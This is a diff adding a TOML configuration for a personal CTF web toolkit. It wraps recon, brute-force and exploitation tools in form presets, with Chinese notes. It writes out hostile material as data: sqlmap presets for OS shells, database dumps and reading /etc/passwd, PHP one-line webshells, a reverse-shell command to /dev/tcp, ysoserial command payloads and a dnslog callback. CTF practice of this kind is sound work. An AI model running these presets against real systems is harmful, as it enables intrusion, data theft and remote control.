@@ -1,0 +1,453 @@
+[app]
+title = "CTF Toolkit"
+port = 8787
+workdir_default = "~/ctf/evidence"
+
+# ─────────────────────────────────────────────────────────────────────────────
+# 工具注册表。每个 [[tool]] 渲染成 UI 里的一个表单。
+#   mode = "argv"  → cmd + 拼出的参数，直接 exec（默认）
+#   mode = "shell" → 表单内容拼成一行交给 bash -lc（管道/重定向用）
+# 字段：
+#   flag      "-u" 之类；留空 = 位置参数（按字段顺序追加）
+#   kind      text / textarea / select / bool / combo / number
+#   tgt       true = 顶部「目标」框留空时自动填这个字段（占位符含 {{TARGET}} 就代入，
+#             否则取目标的主机名），一个工具只标一个
+#   repeat    true = textarea 一行一个，每行都带一次 flag
+#   raw       true = shell 模式下原样插入，不做引号转义
+# {{TARGET}} 在字段值、附加参数里都会被顶部目标替换。
+# presets：点一下先重置表单，再按 set（键可以是字段序号 / flag / 标签）填值，
+#          最后把 args 放进「附加参数」（仍可手改）。
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── 探测 ────────────────────────────────────────────────────────────────────
+[[tool]]
+id = "curl"
+name = "curl"
+category = "recon"
+icon = "🌐"
+desc = "手工 HTTP 请求：方法/头/体/Cookie/代理全可控，看原始响应"
+notes = "-i 带响应头；-k 忽略证书；-L 跟随跳转；-sS 安静但报错\nJSON 请求：-X POST -H 'Content-Type: application/json' -d '{\"a\":1}'"
+cmd = ["curl"]
+fields = [
+  { flag = "", label = "URL", kind = "text", ph = "{{TARGET}}", req = true, tgt = true },
+  { flag = "-X", label = "方法", kind = "select", options = ["", "GET", "POST", "PUT", "DELETE", "PATCH"] },
+  { flag = "-H", label = "请求头", kind = "textarea", repeat = true, ph = "X-Forwarded-For: 127.0.0.1", hint = "一行一个" },
+  { flag = "-d", label = "请求体", kind = "textarea", ph = "username=admin&password=1" },
+  { flag = "-b", label = "Cookie", kind = "text", ph = "PHPSESSID=abc" },
+  { flag = "-x", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+  { flag = "-i", label = "-i 显示响应头", kind = "bool" },
+  { flag = "-k", label = "-k 忽略证书", kind = "bool", default = "1" },
+  { flag = "-L", label = "-L 跟随跳转", kind = "bool", default = "1" },
+  { flag = "-sS", label = "-sS 安静输出", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "GET 看头", args = "-i" },
+  { label = "POST 表单", args = "-i", set = { "-X" = "POST", "-d" = "username=admin&password=admin" } },
+  { label = "XFF 绕过探测", args = "-i", set = { "-H" = "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1" } },
+]
+
+[[tool]]
+id = "whatweb"
+name = "whatweb"
+category = "recon"
+icon = "🔎"
+desc = "指纹识别：CMS/框架/中间件/版本"
+notes = "-a 3 更激进（多发探测包）；--color=never 输出纯文本（已默认开）"
+cmd = ["whatweb"]
+fields = [
+  { flag = "", label = "目标", kind = "text", ph = "{{TARGET}}", req = true, tgt = true },
+  { flag = "-a", label = "强度", kind = "select", options = ["", "1", "3", "4"] },
+  { flag = "-v", label = "-v 详细", kind = "bool" },
+  { flag = "--color=never", label = "纯文本输出", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "标准识别", args = "", set = { "-a" = "3" } },
+  { label = "详细", args = "-v", set = { "-a" = "3" } },
+]
+
+[[tool]]
+id = "httpx"
+name = "httpx"
+category = "recon"
+icon = "📡"
+desc = "存活/标题/技术栈/状态码批量探测（ProjectDiscovery 版）"
+notes = "-u 单目标；-l 目标文件；-td 技术栈；-silent 只打印结果（已默认）"
+cmd = ["httpx"]
+fields = [
+  { flag = "-u", label = "目标", kind = "text", ph = "{{TARGET}}", tgt = true },
+  { flag = "-l", label = "目标列表文件", kind = "text", ph = "hosts.txt" },
+  { flag = "-ports", label = "端口", kind = "text", ph = "80,443,8080,9000" },
+  { flag = "-title", label = "-title 标题", kind = "bool", default = "1" },
+  { flag = "-td", label = "-td 技术栈", kind = "bool", default = "1" },
+  { flag = "-status-code", label = "-status-code 状态码", kind = "bool", default = "1" },
+  { flag = "-follow-redirects", label = "-follow-redirects", kind = "bool" },
+  { flag = "-proxy", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+]
+presets = [
+  { label = "单目标探测", args = "-silent -follow-redirects" },
+  { label = "常见端口", args = "-silent", set = { "-ports" = "80,443,8080,8443,9000,6379,3306" } },
+]
+
+[[tool]]
+id = "nmap"
+name = "nmap"
+category = "recon"
+icon = "🛰️"
+desc = "端口/服务识别（宿主无 root，默认 -sT 连接扫描）"
+notes = "无 CAP_NET_RAW：-sS/-sU/-O 会报权限错误，要 SYN 扫描用 ctfbox nmap -sS（容器内 root）\n目标框自动取主机名，所以顶部填 http://10.0.0.5:8080 也能直接用"
+cmd = ["nmap"]
+fields = [
+  { flag = "", label = "目标", kind = "text", ph = "10.0.0.5", req = true, tgt = true },
+  { flag = "-p", label = "端口", kind = "text", ph = "1-65535", default = "1-10000" },
+  { flag = "-sT", label = "-sT 连接扫描", kind = "bool", default = "1" },
+  { flag = "-sV", label = "-sV 版本", kind = "bool", default = "1" },
+  { flag = "-Pn", label = "-Pn 跳过主机发现", kind = "bool", default = "1" },
+  { flag = "-T4", label = "-T4 加速", kind = "bool", default = "1" },
+  { flag = "--script", label = "NSE 脚本", kind = "text", ph = "http-title,http-headers" },
+]
+presets = [
+  { label = "常用 Web 端口", args = "", set = { "-p" = "80,443,8080,8443,8888,9000,3306,6379,27017" } },
+  { label = "全端口（慢）", args = "--min-rate 2000", set = { "-p" = "1-65535" } },
+  { label = "只跑 HTTP 脚本", args = "--script http-title,http-headers", set = { "-p" = "80,8080,443" } },
+]
+
+# ── 爆破/枚举 ───────────────────────────────────────────────────────────────
+[[tool]]
+id = "ffuf"
+name = "ffuf"
+category = "brute"
+icon = "💥"
+desc = "目录/子域/参数模糊测试；内置 raft 字典"
+notes = "FUZZ 是关键字：目录爆破放 URL 里，参数爆破放 -d 里\n-v 显示完整 URL；-mc 只看指定码；-fc/-fs 过滤"
+cmd = ["ffuf"]
+fields = [
+  { flag = "-u", label = "URL（含 FUZZ）", kind = "text", ph = "{{TARGET}}/FUZZ", req = true, tgt = true },
+  { flag = "-w", label = "字典", kind = "combo", options_from = "wordlists", ph = "字典路径" },
+  { flag = "-X", label = "方法", kind = "select", options = ["", "GET", "POST"] },
+  { flag = "-d", label = "POST 数据（含 FUZZ）", kind = "text", ph = "username=admin&password=FUZZ" },
+  { flag = "-H", label = "请求头", kind = "textarea", repeat = true, ph = "Cookie: x=1" },
+  { flag = "-fc", label = "过滤状态码", kind = "text", ph = "404,403" },
+  { flag = "-fs", label = "过滤大小", kind = "text", ph = "1234" },
+  { flag = "-mc", label = "只看状态码", kind = "text", ph = "200,301,302,403" },
+  { flag = "-e", label = "扩展名", kind = "text", ph = ".php,.bak,.txt" },
+  { flag = "-t", label = "并发", kind = "number", default = "40" },
+  { flag = "-rate", label = "每秒请求", kind = "number", ph = "50" },
+  { flag = "-k", label = "-k 忽略证书", kind = "bool" },
+  { flag = "-s", label = "-s 只输出命中结果", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "目录爆破", args = "", set = { "-w" = "wordlists/raft-small-directories.txt", "-mc" = "200,301,302,403" } },
+  { label = "带扩展名", args = "", set = { "-w" = "wordlists/raft-small-words.txt", "-e" = ".php,.txt,.bak", "-mc" = "200,301,302,403" } },
+  { label = "子域爆破", args = "", set = { "-u" = "https://FUZZ.example.com", "-w" = "wordlists/raft-small-words.txt", "-mc" = "200,301" } },
+  { label = "POST 参数爆破", args = "", set = { "-u" = "{{TARGET}}/login.php", "-X" = "POST", "-d" = "username=admin&password=FUZZ", "-w" = "wordlists/common.txt", "-fs" = "0" } },
+  { label = "参数名爆破", args = "", set = { "-u" = "{{TARGET}}?FUZZ=1", "-w" = "wordlists/common.txt", "-mc" = "200,500" } },
+]
+
+[[tool]]
+id = "dirsearch"
+name = "dirsearch"
+category = "brute"
+icon = "🧭"
+desc = "目录扫描（自带默认字典、支持递归）"
+notes = "--exclude-status=404 排除干扰；-r 递归；--proxy 走 Clash"
+cmd = ["dirsearch"]
+fields = [
+  { flag = "-u", label = "目标 URL", kind = "text", ph = "{{TARGET}}", req = true, tgt = true },
+  { flag = "-w", label = "字典", kind = "combo", options_from = "wordlists", ph = "留空用自带" },
+  { flag = "-e", label = "扩展名", kind = "text", ph = "php,html,js" },
+  { flag = "-t", label = "线程", kind = "number", default = "30" },
+  { flag = "--exclude-status", label = "排除状态码", kind = "text", ph = "404,400" },
+  { flag = "-r", label = "-r 递归", kind = "bool" },
+  { flag = "-x", label = "排除路径", kind = "text", ph = "logout,signout" },
+  { flag = "--proxy", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+  { flag = "--plain-text-report", label = "纯文本报告输出到", kind = "text", ph = "dirsearch.txt" },
+]
+presets = [
+  { label = "常规扫描", args = "", set = { "-e" = "php,html,js,txt,bak", "--exclude-status" = "404" } },
+  { label = "用 raft 字典递归", args = "-r", set = { "-w" = "wordlists/raft-small-directories.txt", "-e" = "php,bak,txt" } },
+]
+
+[[tool]]
+id = "gobuster"
+name = "gobuster"
+category = "brute"
+icon = "📂"
+desc = "dir 模式目录爆破 / vhost 模式子域枚举"
+notes = "vhost 模式还需 --domain；dns 模式给 -d 域名"
+cmd = ["gobuster"]
+fields = [
+  { flag = "", label = "模式", kind = "select", options = ["dir", "vhost", "dns"], default = "dir" },
+  { flag = "-u", label = "目标 URL", kind = "text", ph = "{{TARGET}}", req = true, tgt = true },
+  { flag = "-w", label = "字典", kind = "combo", options_from = "wordlists", ph = "字典路径", req = true },
+  { flag = "-x", label = "扩展名", kind = "text", ph = "php,html,txt" },
+  { flag = "-t", label = "线程", kind = "number", default = "30" },
+  { flag = "--domain", label = "vhost 域名", kind = "text", ph = "example.com" },
+  { flag = "-k", label = "-k 忽略证书", kind = "bool", default = "1" },
+  { flag = "--no-error", label = "隐藏错误", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "目录爆破", args = "", set = { "0" = "dir", "-w" = "wordlists/common.txt", "-x" = "php,html,txt" } },
+  { label = "子域 vhost", args = "", set = { "0" = "vhost", "-w" = "wordlists/raft-small-words.txt" } },
+]
+
+# ── 漏洞利用 ────────────────────────────────────────────────────────────────
+[[tool]]
+id = "sqlmap"
+name = "sqlmap"
+category = "vuln"
+icon = "🗄️"
+desc = "SQL 注入检测与利用（预设覆盖：探点/列库/列表/拖库/OS-Shell）"
+notes = "--batch 全程默认回答（已勾选），跑全流程必须加\n顺序：探注入点 → 列数据库 → 列表 → 拖表；报错/时间盲注加 --technique\n真有 WAF 时换 --tamper=space2comment,between"
+cmd = ["sqlmap"]
+fields = [
+  { flag = "-u", label = "目标 URL", kind = "text", ph = "{{TARGET}}", hint = "带注入点的完整 URL", tgt = true },
+  { flag = "-r", label = "请求文件", kind = "text", ph = "req.txt", hint = "Burp 存下的原始请求，和 -u 二选一" },
+  { flag = "--data", label = "POST 数据", kind = "text", ph = "id=1&submit=1" },
+  { flag = "-p", label = "指定参数", kind = "text", ph = "id" },
+  { flag = "--cookie", label = "Cookie", kind = "text", ph = "PHPSESSID=..." },
+  { flag = "--dbms", label = "DBMS", kind = "select", options = ["", "mysql", "mariadb", "postgresql", "mssql", "sqlite", "oracle"] },
+  { flag = "--level", label = "level", kind = "select", options = ["", "1", "2", "3", "5"] },
+  { flag = "--risk", label = "risk", kind = "select", options = ["", "1", "2", "3"] },
+  { flag = "--technique", label = "technique", kind = "select", options = ["", "BEUSTQ", "BEU", "T", "U", "S"] },
+  { flag = "--tamper", label = "tamper", kind = "text", ph = "space2comment,between" },
+  { flag = "--threads", label = "线程", kind = "number", default = "4" },
+  { flag = "--proxy", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+  { flag = "--random-agent", label = "随机 UA", kind = "bool", default = "1" },
+  { flag = "--batch", label = "--batch 自动确认", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "探注入点", args = "", set = { "--level" = "2", "--risk" = "1" } },
+  { label = "列数据库", args = "--dbs" },
+  { label = "列当前库表", args = "-D <db> --tables" },
+  { label = "拖表", args = "-D <db> -T <table> --dump" },
+  { label = "拖整库（慢）", args = "--dump-all --exclude-sysdbs" },
+  { label = "拿 OS-Shell", args = "--os-shell" },
+  { label = "读文件", args = "--file-read=/etc/passwd" },
+  { label = "WAF 绕过", args = "--tamper=space2comment,between", set = { "--technique" = "BEU" } },
+]
+
+[[tool]]
+id = "nuclei"
+name = "nuclei"
+category = "vuln"
+icon = "☢️"
+desc = "基于模板的漏洞扫描（CVE / 默认口令 / 暴露面）"
+notes = "首次运行会更新模板；-rl 限速避免被 WAF 封；-stats 显示进度（已勾选）"
+cmd = ["nuclei"]
+fields = [
+  { flag = "-u", label = "目标", kind = "text", ph = "{{TARGET}}", tgt = true },
+  { flag = "-l", label = "目标列表", kind = "text", ph = "urls.txt" },
+  { flag = "-severity", label = "级别", kind = "select", options = ["", "critical,high", "critical,high,medium", "critical"] },
+  { flag = "-tags", label = "tags", kind = "text", ph = "cve,exposure" },
+  { flag = "-t", label = "指定模板目录", kind = "text", ph = "http/cves/2021/" },
+  { flag = "-rl", label = "限速/秒", kind = "number", ph = "50" },
+  { flag = "-c", label = "并发", kind = "number", default = "25" },
+  { flag = "-proxy", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+  { flag = "-stats", label = "-stats 进度", kind = "bool", default = "1" },
+]
+presets = [
+  { label = "高危+CVE", args = "", set = { "-severity" = "critical,high,medium" } },
+  { label = "暴露面/配置", args = "-tags exposure,config,misconfig" },
+  { label = "默认口令", args = "-tags default-login" },
+]
+
+[[tool]]
+id = "dalfox"
+name = "dalfox"
+category = "vuln"
+icon = "🧨"
+desc = "XSS 自动化扫描（反射/存储/DOM）"
+notes = "带参数的 URL 会自动测所有 query 参数；--deep-domxss 更彻底但更慢\n--blind 配 XSS 平台收打点"
+cmd = ["dalfox"]
+fields = [
+  { flag = "url", label = "目标 URL", kind = "text", ph = "{{TARGET}}", req = true, tgt = true },
+  { flag = "--cookie", label = "Cookie", kind = "text", ph = "PHPSESSID=..." },
+  { flag = "--header", label = "请求头", kind = "textarea", repeat = true, ph = "X-Forwarded-For: 1.2.3.4" },
+  { flag = "--data", label = "POST 数据", kind = "text", ph = "q=test" },
+  { flag = "--method", label = "方法", kind = "select", options = ["", "GET", "POST"] },
+  { flag = "--deep-domxss", label = "深扫 DOM", kind = "bool" },
+  { flag = "--worker", label = "worker", kind = "number", default = "30" },
+  { flag = "--proxy", label = "代理", kind = "text", ph = "http://127.0.0.1:7897" },
+  { flag = "--output", label = "输出文件", kind = "text", ph = "dalfox.txt" },
+]
+presets = [
+  { label = "扫当前 URL", args = "" },
+  { label = "深扫 DOM", args = "--deep-domxss --worker 20" },
+  { label = "POST 参数", args = "", set = { "--method" = "POST", "--data" = "q=1" } },
+]
+
+[[tool]]
+id = "fenjing"
+name = "fenjing"
+category = "vuln"
+icon = "🐍"
+desc = "SSTI（Jinja2）自动构造 payload，或直接打 URL 取 flag"
+notes = "crack 模式直接打目标；payload 模式只吐字符串\n有 WAF 时给 -e（如 length、replace）；字段名猜不准就用 --detect"
+cmd = ["fenjing"]
+fields = [
+  { flag = "", label = "模式", kind = "select", options = ["crack", "payload"], default = "crack" },
+  { flag = "-u", label = "目标 URL", kind = "text", ph = "{{TARGET}}", tgt = true },
+  { flag = "-f", label = "表单字段", kind = "text", ph = "name" },
+  { flag = "-m", label = "HTTP 方法", kind = "select", options = ["", "GET", "POST"] },
+  { flag = "-e", label = "WAF 绕过", kind = "text", ph = "length,replace" },
+  { flag = "-a", label = "要执行的命令", kind = "text", ph = "ls /;cat /flag" },
+]
+presets = [
+  { label = "打目标取 flag", args = "", set = { "0" = "crack", "-a" = "ls /;cat /flag" } },
+  { label = "只出 payload", args = "", set = { "0" = "payload", "-a" = "ls /" } },
+]
+
+[[tool]]
+id = "jwt"
+name = "jwt_tool"
+category = "vuln"
+icon = "🔑"
+desc = "JWT 检测与攻击：alg=none、弱密钥爆破、kid 注入、伪造字段"
+notes = "先 -t/-rc 让它抓到 token 再 -M 各种模式；有 token 可直接贴第一个框\n-M at 扫全套；-X a 试 alg=none；-C -d 爆破密钥"
+cmd = ["/home/xendr1a/ctf/.venv/bin/python", "/home/xendr1a/ctf/tools/jwt_tool/jwt_tool.py"]
+fields = [
+  { flag = "", label = "Token", kind = "textarea", ph = "eyJhbGciOi...", hint = "留空则靠 -t/-rc 自动抓" },
+  { flag = "-t", label = "目标 URL", kind = "text", ph = "{{TARGET}}", tgt = true },
+  { flag = "-rc", label = "带 token 的 Cookie", kind = "text", ph = "auth=<token>" },
+  { flag = "-M", label = "模式", kind = "select", options = ["", "pb", "at", "er", "cc", "ij"] },
+  { flag = "-X", label = "利用", kind = "select", options = ["", "a", "n", "b", "k", "i"] },
+  { flag = "-C", label = "-C 爆破弱密钥", kind = "bool" },
+  { flag = "-d", label = "字典", kind = "combo", options_from = "wordlists", ph = "rockyou.txt" },
+  { flag = "-pc", label = "载荷字段", kind = "text", ph = "role" },
+  { flag = "-pv", label = "载荷值", kind = "text", ph = "admin" },
+]
+presets = [
+  { label = "全套攻击面", args = "-M at" },
+  { label = "试 alg=none", args = "-X a" },
+  { label = "爆破弱密钥", args = "", set = { "-C" = "1", "-d" = "wordlists/raft-small-words.txt" } },
+  { label = "改字段伪造", args = "-T", set = { "-pc" = "role", "-pv" = "admin" } },
+]
+
+[[tool]]
+id = "phpggc"
+name = "phpggc"
+category = "vuln"
+icon = "🐘"
+desc = "PHP 反序列化 gadget 链生成（Laravel/Symfony/Guzzle/Monolog…）"
+notes = "-l 列出全部链；-i 看某条链要什么调用参数\n加 -b 出 base64，-u 出 urlencode；把输出塞进存在反序列化入口的参数里"
+cmd = ["php", "/home/xendr1a/ctf/tools/phpggc/phpggc"]
+fields = [
+  { flag = "-l", label = "-l 列出所有链", kind = "bool" },
+  { flag = "", label = "链名", kind = "text", ph = "Laravel/RCE9" },
+  { flag = "", label = "函数/命令", kind = "text", ph = "system" },
+  { flag = "", label = "参数", kind = "text", ph = "id" },
+  { flag = "-b", label = "-b base64", kind = "bool" },
+  { flag = "-u", label = "-u urlencode", kind = "bool" },
+  { flag = "-i", label = "-i 查看链信息", kind = "bool" },
+]
+presets = [
+  { label = "有哪些链", args = "", set = { "0" = "1" } },
+  { label = "Laravel RCE (base64)", args = "", set = { "1" = "Laravel/RCE9", "2" = "system", "3" = "id", "4" = "1" } },
+  { label = "Symfony RCE", args = "", set = { "1" = "Symfony/RCE13", "2" = "system", "3" = "id" } },
+  { label = "Guzzle 信息泄露", args = "", set = { "1" = "Guzzle/FW1", "2" = "/etc/passwd" } },
+]
+
+[[tool]]
+id = "filterchain"
+name = "php_filter_chain"
+category = "vuln"
+icon = "⛓️"
+desc = "PHP filter chain RCE：把任意字符串变成 LFI 也能吃下的 php://filter 链"
+notes = "前提：有 include 点能塞 php://filter/convert.base64-decode/resource=…\n链非常长，塞 URL 用 --urlencode 版；一句话马建议保持极短"
+cmd = ["python3", "/home/xendr1a/ctf/tools/php_filter_chain_generator/php_filter_chain_generator.py"]
+fields = [
+  { flag = "--chain", label = "要注入的 PHP 代码", kind = "text", ph = "<?=`$_GET[0]`?>" },
+  { flag = "--rawbase64", label = "base64 载荷", kind = "text", ph = "PD89YCRfR0VUWzBdYD8+" },
+  { flag = "--prefix", label = "前缀代码", kind = "text", ph = "<?php system($_GET[0]);?>" },
+  { flag = "--urlencode", label = "URL 编码输出", kind = "bool" },
+]
+presets = [
+  { label = "一句话木马", args = "", set = { "--chain" = "<?=`$_GET[0]`?>" } },
+  { label = "带前缀 + urlencode", args = "--urlencode", set = { "--prefix" = "<?php system($_GET[0]);?>" } },
+]
+
+[[tool]]
+id = "ysoserial"
+name = "ysoserial"
+category = "vuln"
+icon = "☕"
+desc = "Java 反序列化 payload 生成（已带 --add-opens，JDK 27 可跑）"
+notes = "不给链名就列出所有链；URLDNS 用来验证出网/DNS\n不出网时优先 CommonsBeanutils1/CommonsCollections 系"
+allow_empty = true
+cmd = ["java", "--add-opens", "java.base/java.lang=ALL-UNNAMED", "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED", "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED", "--add-opens", "java.base/java.util=ALL-UNNAMED", "-jar", "/home/xendr1a/ctf/tools/ysoserial-all.jar"]
+fields = [
+  { flag = "", label = "链名", kind = "text", ph = "CommonsBeanutils1" },
+  { flag = "", label = "命令 / URL", kind = "text", ph = "touch /tmp/pwned" },
+  { flag = "-o", label = "输出文件", kind = "text", ph = "payload.ser" },
+]
+presets = [
+  { label = "列出所有链", args = "" },
+  { label = "URLDNS 探外连", args = "", set = { "0" = "URLDNS", "1" = "http://xxx.dnslog.cn" } },
+  { label = "CB1 命令执行", args = "", set = { "0" = "CommonsBeanutils1", "1" = "touch /tmp/pwned" } },
+]
+
+# ── 本地/辅助 ───────────────────────────────────────────────────────────────
+[[tool]]
+id = "httpserver"
+name = "静态服务"
+category = "local"
+icon = "🗂️"
+desc = "python3 -m http.server —— 起本地静态站（挂 payload / 回连文件 / 钓鱼样本）"
+notes = "默认监听 0.0.0.0；题目容器能回连你的 IP 时才有用\n端口冲突换一个；停止按钮就是关闭服务"
+cmd = ["python3", "-m", "http.server"]
+fields = [
+  { flag = "--bind", label = "绑定地址", kind = "text", ph = "0.0.0.0", default = "0.0.0.0" },
+  { flag = "--directory", label = "根目录", kind = "text", ph = "." },
+  { flag = "", label = "端口", kind = "number", default = "8000", req = true },
+]
+presets = [
+  { label = "起在 8000", args = "", set = { "2" = "8000", "--bind" = "0.0.0.0" } },
+]
+
+[[tool]]
+id = "nc"
+name = "nc 监听"
+category = "local"
+icon = "🎧"
+desc = "反弹 shell 监听（-lvnp 等价写法）"
+notes = "反弹命令：bash -i >& /dev/tcp/你的IP/9001 0>&1\nopenbsd nc 里端口可以跟在 -l 后面：nc -lvn 9001"
+cmd = ["nc"]
+fields = [
+  { flag = "-l", label = "-l 监听", kind = "bool", default = "1" },
+  { flag = "-v", label = "-v 详细", kind = "bool", default = "1" },
+  { flag = "-n", label = "-n 不做 DNS", kind = "bool", default = "1" },
+  { flag = "", label = "端口", kind = "number", default = "9001", req = true },
+]
+presets = [
+  { label = "监听 9001", args = "" },
+]
+
+[[tool]]
+id = "shell"
+name = "自由命令"
+category = "local"
+icon = "⌨️"
+desc = "任意 shell 命令（管道/重定向/多工具串联），在工作目录执行"
+mode = "shell"
+notes = "命令里的 {{TARGET}} 同样被顶部目标替换；输出实时流回页面\n长任务可以点停止（SIGTERM 整个进程组）"
+cmd = ["bash", "-lc"]
+fields = [
+  { flag = "", label = "命令", kind = "textarea", raw = true, ph = "ffuf -u {{TARGET}}/FUZZ -w wordlists/common.txt | tee out.txt", req = true },
+]
+presets = [
+  { label = "整段 C 扫 /24", args = "for i in $(seq 1 254); do (curl -s -m 1 -o /dev/null -w \"$i %{http_code}\\n\" http://10.0.0.$i/ &) ; done; wait" },
+  { label = "翻本地 flag", args = "grep -rIl 'flag{' . 2>/dev/null | head" },
+  { label = "看程序保护", args = "file ./chall; checksec --file=./chall" },
+]
+
+[[tool]]
+id = "cyberchef"
+name = "CyberChef"
+category = "local"
+icon = "🧰"
+desc = "本地离线 CyberChef（编码/解码/哈希/加解密/压缩/取证）"
+notes = "v11.6.0，从 GitHub release 解包到 vendor/cyberchef/，完全离线。"
+view = "iframe"
+url = "/vendor/cyberchef/index.html"
+fields = []
+presets = []
